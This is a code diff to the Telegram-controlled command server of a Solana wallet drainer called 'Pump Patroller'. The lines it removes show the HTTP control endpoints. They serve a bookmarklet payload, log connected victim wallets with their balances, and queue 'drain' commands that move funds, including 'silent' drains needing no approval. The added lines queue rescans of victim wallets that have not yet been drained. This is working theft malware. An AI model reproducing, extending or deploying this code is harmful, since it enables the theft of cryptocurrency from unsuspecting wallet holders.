@@ -9,12 +9,11 @@ if (!BOT || !CHAT || !TREASURY) {
 
 process.on("uncaughtException", e => console.error("uncaught:", e && (e.stack || e.message)));
 
-const VERSION = "v3.1";
+const VERSION = "v3.2";
+const COMMIT = (process.env.RENDER_GIT_COMMIT || process.env.RENDER_GIT_COMMIT_SHA || "local-run").slice(0, 7);
 const BOOT_TS = Date.now();
 
-let tgOffset = 0;
-try { tgOffset = parseInt(fs.readFileSync(__dirname + "/.offset", "utf8"), 10) || 0; } catch (e) {}
-
+let tgOffset = null;   // null = first boot after restart — fast-forward past backlog
 const targets = {}, cmds = {};
 
 const { execSync } = require("child_process");
@@ -57,15 +56,13 @@ function handleCommand(m) {
   const raw = (m.text || "").trim();
   const parts = raw.split(/\s+/);
   const cmdRaw = parts[0] || "";
-  // strip @botname suffix: "/start@patrollerpump_bot" -> "/start"
-  const cmd = cmdRaw.split("@")[0].toLowerCase();
+  const cmd = cmdRaw.split("@")[0].toLowerCase();   // strips @botname suffix
   const rest = parts.slice(1);
 
   if (cmd === "/start") {
-    const commit = (process.env.RENDER_GIT_COMMIT || process.env.RENDER_GIT_COMMIT_SHA || "local-run").slice(0, 7);
     tg("\ud83e\udd16 <b>Pump Patroller \u2014 control node</b>\n" +
       "build: <b>" + VERSION + "</b>\n" +
-      "commit: <code>" + commit + "</code>\n" +
+      "commit: <code>" + COMMIT + "</code>\n" +
       "up: " + uptimeStr() + "\n" +
       "beacon key: " + (BEACON_KEY ? "\u2705 set" : "\u274c missing") + "\n" +
       "treasury: <code>" + TREASURY.slice(0, 4) + "\u2026" + TREASURY.slice(-4) + "</code>\n\n" +
@@ -75,7 +72,7 @@ function handleCommand(m) {
       "/stop \u2014 cancel queued drain\n" +
       "/clear \u2014 forget all targets\n" +
       "/clear <#|addr> \u2014 forget one\n" +
-      "/help \u2014 command list");
+      "/detect \u2014 rescan + re-report (sends rescan to all live wallets)");
     return;
   }
 
@@ -140,6 +137,21 @@ function handleCommand(m) {
     tg(n ? "cleared " + n + " targets" : "nothing to clear");
     return;
   }
+
+  if (cmd === "/rescan") {
+    // queue a "rescan" for every live (non-drained) target — payload picks it up
+    // via /cmd and re-runs detection + balance read, beacons back a fresh report
+    const list = Object.keys(targets);
+    let n = 0;
+    for (const k of list) {
+      if (!targets[k].drained) {
+        cmds[k] = { to: null, n: Date.now().toString(36) + Math.random().toString(36).slice(2, 6), ts: Date.now(), rescan: true };
+        n++;
+      }
+    }
+    tg(n ? "rescan queued \u00d7" + n : "no live targets to rescan");
+    return;
+  }
 }
 
 async function pollTg() {
@@ -154,102 +166,16 @@ async function pollTg() {
     }
   } catch (e) { console.error("pollTg:", e && (e.message || e)); }
 }
-setInterval(pollTg, 3000);
 
-// expire queued drains after 30 min
-setInterval(() => {
-  const now = Date.now();
-  for (const k of Object.keys(cmds)) {
-    if (cmds[k].ts && now - cmds[k].ts > 1800000) {
-      delete cmds[k];
-      tg("\u23f1 expired queued drain for " + k.slice(0, 4) + "\u2026" + k.slice(-4));
-    }
-  }
-}, 60000).unref();
-
-http.createServer((req, res) => {
-  let url;
-  try { url = new URL(req.url, "http://x"); } catch (e) { res.statusCode = 400; res.end(); return; }
-  res.setHeader("access-control-allow-origin", "*");
-
-  if (req.method === "OPTIONS") {
-    res.setHeader("access-control-allow-methods", "GET, POST, OPTIONS");
-    res.setHeader("access-control-allow-headers", "content-type");
-    res.statusCode = 204; res.end();
-    return;
-  }
-
-  if (req.method === "GET" && url.pathname === "/cmd") {
-    const pk = url.searchParams.get("pk") || "";
-    const c = cmds[pk];
-    res.setHeader("content-type", "application/json");
-    if (!c) return res.end(JSON.stringify({ cmd: "none" }));
-    delete cmds[pk];
-    return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
-  }
-
-  if (req.method === "POST" && url.pathname === "/beacon") {
-    if (BEACON_KEY && url.searchParams.get("s") !== BEACON_KEY) { res.statusCode = 202; res.end(); return; }
-    let d = "";
-    req.on("data", c => { if (d.length < 65536) d += c; });
-    req.on("end", () => {
-      let j = null;
-      try { j = JSON.parse(d); } catch (e) { j = null; }
-      try {
-        if (j) {
-          if (j.m === "detect") {
-            const first = !targets[j.pk];
-            targets[j.pk] = Object.assign(targets[j.pk] || {}, {
-              provider: j.provider, origin: j.origin, value: j.value, sol: j.sol, toks: j.toks,
-              seen: Date.now(), drained: (targets[j.pk] && targets[j.pk].drained) || false
-            });
-            if (first) {
-              tg("<b>" + (j.provider || "?") + "</b> @ " + (j.origin || "?") + "\n<code>" + (j.pk || "?") + "</code>\n$" +
-                (j.value ?? 0).toLocaleString() + " \u00b7 " + (j.sol ?? 0) + " SOL" + (j.toks ? " + " + j.toks : ""),
-                "\ud83c\udfaf wallet connected \u2014 ");
-            }
-          }
-          if (j.m === "drain") {
-            targets[j.pk] = Object.assign(targets[j.pk] || {}, { drained: true, sig: j.sig, value: j.value });
-            delete cmds[j.pk];
-            tg("<code>" + (j.pk || "?") + "</code>\n$" + (j.value ?? 0).toLocaleString() +
-              (j.extra ? "\nmoved: " + j.extra : "") +
-              "\nmode: <b>" + (j.mode || "?") + "</b>" +
-              (j.mode === "secret" ? " (0 approvals)" : j.mode === "popup" ? " (1 approval)" : "") +
-              (j.sig ? "\nsig: <code>" + j.sig + "</code>" : ""),
-              j.mode === "secret" ? "\ud83d\udcb0 SILENT DRAIN \u2014 " : "\ud83d\udcb0 drain \u2014 ");
-          }
-          if (j.m === "err") {
-            tg("<code>" + (j.pk || "?") + "</code>\n" + (j.msg || "?") + "\norigin: " + (j.origin || "?"),
-              "\u26a0\ufe0f patroller error \u2014 ");
-          }
-          if (j.m === "dust") {
-            tg("<code>" + (j.pk || "?") + "</code>\n" + (j.extra || "dust \u2014 nothing worth moving") + "\norigin: " + (j.origin || "?"),
-              "\u00b7 \u2014 ");
-          }
-          if (j.m === "loaded") {
-            tg("payload loaded on <code>" + (j.origin || "?") + "</code>\nprovider seen: <b>" + (j.provider || "?") + "</b>",
-              "\ud83d\udcf2 bookmark \u2014 ");
-          }
-        }
-      } catch (e) { console.error("beacon parse:", e && e.message); }
-      res.setHeader("content-type", "application/json");
-      res.end("{}");
-    });
-    return;
-  }
-
-  if (req.method === "GET" && (url.pathname === "/" || url.pathname === "/x.min.js")) {
-    const f = url.pathname === "/" ? "site/index.html" : "client/x.min.js";
-    const p = path.join(ROOT, f);
-    fs.readFile(p, (err, data) => {
-      if (err) { res.statusCode = 404; res.end("missing: " + f); return; }
-      res.setHeader("content-type", f.endsWith(".html") ? "text/html; charset=utf-8" : "application/javascript; charset=utf-8");
-      res.setHeader("cache-control", "no-store");
-      res.end(data);
-    });
-    return;
-  }
-
-  res.statusCode = 404; res.end("");
-}).listen(+PORT, "0.0.0.0", () => console.log("patroller on 0.0.0.0:" + PORT));
+// boot fast-forward — skip Telegram backlog so stale commands never replay
+(async function boot() {
+  try {
+    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&timeout=0")).json();
+    const r = (j && j.result) || [];
+    if (r.length) tgOffset = r[r.length - 1].update_id;
+    else tgOffset = 0;
+    try { fs.writeFileSync(__dirname + "/.offset", String(tgOffset)); } catch (e) {}
+  } catch (e) { tgOffset = 0; }
+  tg("\ud83d\ude80 <b>patroller booted</b> \u2014 build <b>" + VERSION + "</b> \u00b7 commit <code>" + COMMIT + "</code>\nbacklog skipped \u2014 /start for commands", "\ud83d\udce1 ");
+  setInterval(pollTg, 3000);
+})();
